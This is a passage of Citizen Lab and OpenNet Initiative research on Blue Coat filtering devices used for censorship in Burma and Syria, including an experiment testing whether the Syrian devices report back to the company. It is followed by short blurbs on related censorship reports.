HTTP, and no HTTPS URLs were found to be blocked in ONI testing. Anecdotal reports from Burmese Internet users have suggested that the HTTPS version of many sites are not blocked in the country, providing an easy method of circumvention.33 It is thus possible that these two URLs were accessible because no HTTPS URLs are blocked in Burma, although further testing would be required to confirm this.\nThird, systems administrators are able to adjust blocking settings to supplement lists of blocked URLs. For example, an independent Burmese news website based in Thailand, http://www.mizzima.com, is classified by Blue Coat as News/Media, a content category that was not found to be uniformly blocked in ONI testing. However, ONI testing did find this particular URL to be blocked, as it has been consistently since 2005.34 While systems administrators may not block access to all URLs categorized as News/Media, they likely make exceptions for particular sites of interest. Thus, it is possible that some of the aberrations seen in Table 1 reflect manual adjustments to what is or is not blocked within a particular content category.\nLastly, it is possible that Yatanarpon is using an alternate filtering system and this correlation with Blue Coat categories is merely a reflection of different filtering systems blocking similar content. Determining this more definitively would require testing of a much larger sample size and additional content from categories suspected of blocking. Although this type of additional testing has not yet been conducted, we believe that the existing correlation shown with this smaller sample size, combined with the additional technical evidence mentioned, makes a strong case that Blue Coat’s devices are used in Burma.\nQuestions for Blue Coat\nThe findings outlined in this brief raise a number of additional questions about the use of Blue Coat technology in Syria and Burma. Such questions include:\n\nIs Blue Coat aware of the use of their products and/or services in Burma/Myanmar?\nIf so, has Blue Coat taken any steps to restrict the functionality of those devices?\nHas Blue Coat identified any Blue Coat products or services being used in Syria outside of the 13 already identified?\nIn light of these recent findings, will Blue Coat actively monitor the devices that contact its servers to prevent Blue Coat technology from being used in embargoed countries?\nIf Blue Coat forbids its resellers from selling to embargoed countries, what actions will Blue Coat take with respect to the reseller who brought the 13 devices identified by Blue Coat to Syria?\nDoes Blue Coat have a policy for evaluating the sale of products and services to government, government-controlled or government-affiliated entities that engage in filtering of political content? If so, will Blue Coat share that policy?\n\nThe Citizen Lab strongly urges Blue Coat to investigate the additional findings presented in this brief, and to take all necessary steps to limit the functionality of Blue Coat devices located in Syria and Burma.\nAcknowledgments: The Citizen Lab and OpenNet Initiative would like to thank two anonymous testers for their assistance in collecting data from Burma.\nUPDATE: Are Blue Coat devices in Syria “phoning home”?\nFollowing the discovery of Blue Coat Systems networking devices in Syria, the company claimed in a statement that the devices are “not able to use Blue Coat’s cloud-based WebPulse service” or “run the Blue Coat WebFilter database”. Blue Coat also suggested that the devices are now “operating independently” and that the company does not have a “kill switch” to remotely disable the devices.Over the period of 3 weeks in July 2012, we tested this claim through the use of Blue Coat’s Site Review process, which allows anyone to determine Blue Coat’s categorization of a website. The experiment was based on the hypothesis that should a new website which had not been accessed anywhere but via a Syrian ISP be found to be categorized by Blue Coat, this could indicate the Syrian devices were “phoning home” to the company. Also, should a newly-created website which belongs to a Blue Coat category blocked in Syria be found to be blocked in that country, this could indicate the devices were receiving updates from Blue Coat.\nAs an experiment, three groups of domains were created (A, B and C) with newly registered, previously unused domain names. Each of the sites contained the same content, that of a proxy circumvention service. It is well established that Syria actively targets circumvention tools and services for filtering. The group A URLs were submitted to Blue Coat’s Site Review process for analysis and within a day were identified as proxy sites. The group B URLs were accessed exclusively through a Syrian proxy and were found to be accessible. The group C URLs were left idle as a control.\nFive days following the categorization of the group A URLs, these URLs were checked through a Syrian proxy and found to be accessible. This suggests that either the Blue Coat devices in Syria did not receive these updates or that the Syrian proxy used for testing was not on a network which uniformly blocked the “Proxy Avoidance” category.\nFourteen days after the group B URLs were accessed from Syria, their categorization was identified through the Site Review process. All URLs in this group were found to not have been categorized. This result suggests that the Syrian devices did not send any information about the group B URLs back to Blue Coat.\nInterestingly, attempts to access a number of Blue Coat related web domains from Syria also failed. Using both a publicly available proxy and a privately operated proxy in Syria, a number of domains related to Blue Coat (www.bluecoat.com, cfauth.com, bluecoat.com.tw and k9webprotection.com) were found to be inaccessible in all tests. These domains were previously accessible through the same proxies prior to the release of this report.\nWhile these experiments are not definitive, they do suggest that Blue Coat devices in Syria are not ‘phoning home’ to the company’s servers in California and further, that Blue Coat may have blocked traffic on Syrian ISPs from accessing its websites.\n \nFootnotes:\n1 Amnesty International, “Syria – Annual Report 2011,” http://www.amnesty.org/en/region/syria/report-2011; Human Rights Watch, “Syria’s human rights crisis: Myths and realities,” August 24, 2011, http://www.hrw.org/news/2011/08/24/syria-s-human-rights-crisis-myths-and-realities\n2 Blue Coat Systems, “Largest companies in the world rely on Blue Coat solutions,” October 12, 2011, http://www.bluecoat.com/company/press-releases/largest-companies-world-rely-blue-coat-solutions; Blue Coat, “ProxySG Addons,” http://www.bluecoat.com/products/proxysg/addons.\n3 Reflets.info, “Web censorship technologies in Syria revealed,” August 12, 2011, http://reflets.info/opsyria-web-censorship-technologies-in-syria-revealed-en/\n4 Reflets.info, “Bluecoat’s role in Syria censorship and nationwide monitoring system,” September 1, 2011, http://reflets.info/bluecoats-role-in-syrian-censorship-and-nationwide-monitoring-system/\n5 Horwitz, S., “Syria using American software to censor Internet, experts say,” Washington Post, October 23, 2011, http://www.washingtonpost.com/world/national-security/syria-using-american-software-to-censor-internet-experts-say/2011/10/22/gIQA5mPr7L_story.html\n6 See U.S. Department of the Treasury, “Syria Sanctions,” http://www.treasury.gov/resource-center/sanctions/Programs/pages/syria.aspx\n7 Espiner, T., “Blue Coat web filtering technology ‘used by Syria’, ZDNet, September 5, 2011, http://www.zdnet.co.uk/blogs/security-bullet-in-10000166/blue-coat-web-filtering-technology-used-by-syria-10024276/\n8 Horwitz, S., “Syria using American software to censor Internet, experts say,” Washington Post, October 23, 2011, http://www.washingtonpost.com/world/national-security/syria-using-american-software-to-censor-internet-experts-say/2011/10/22/gIQA5mPr7L_story.html\n9 Horwitz, S.i, “Syria using American software to censor Internet, experts say,” Washington Post, October 23, 2011, http://www.washingtonpost.com/world/national-security/syria-using-american-software-to-censor-internet-experts-say/2011/10/22/gIQA5mPr7L_story.html\n10 Valentino-Devries, J., Sonne, P. and N.

The research combines data from three major sources: two years’ worth of traffic data from the BBC’s web content services, in-field testing of Iranian and Chinese Internet censorship undertaken by the OpenNet Initiative (ONI), and service delivery of Psiphon Inc, a Canadian “circumvention” service that delivers uncensored connections to the web for citizens living behind national firewalls.\nCasting a Wider Net sheds a bright spotlight on what is typically a shadow game: the race among government censors to block content, and those determined to sidestep those efforts. China and Iran are among the world’s most pervasive filters of Internet content, and present a special challenge to global media broadcasters who are often targeted by governments for blocking. BBC’s Mandarin and Farsi services are normally subject to intense blocking efforts by both countries.\nThe full report can be downloaded freely online at http://uoft.me/casting.\nTo read the New York Times article on the report, click here.\n\n\t\t\t\t\n\t\t\t",

Faith-based filtering is becoming a contested issue in many of these countries. There is an ongoing struggle between state and nonstate actors who want to regulate the Internet to protect and even strengthen the Islamicity of their countries, and those who see the Internet as an alternative information tool to bypass the undesirable guardianship of the religious authorities—those who see the Internet as a potential threat to religious identity, and those who strive to bring to censored real space some of the qualities of the Internet: openness, freedom, and neutrality\nThis OpenNet Initiative occasional paper was authored by Helmi Noman, who is a Senior Researcher at the Citizen Lab, Munk School of Global Affairs, University of Toronto and a Research Affiliate at the Berkman Center for Internet and Society, Harvard University.\nThe OpenNet Initiative is a collaborative partnership of three institutions: the Citizen Lab at the Munk School of Global Affairs, University of Toronto; the Berkman Center for Internet & Society at Harvard University; and the SecDev Group (Ottawa).
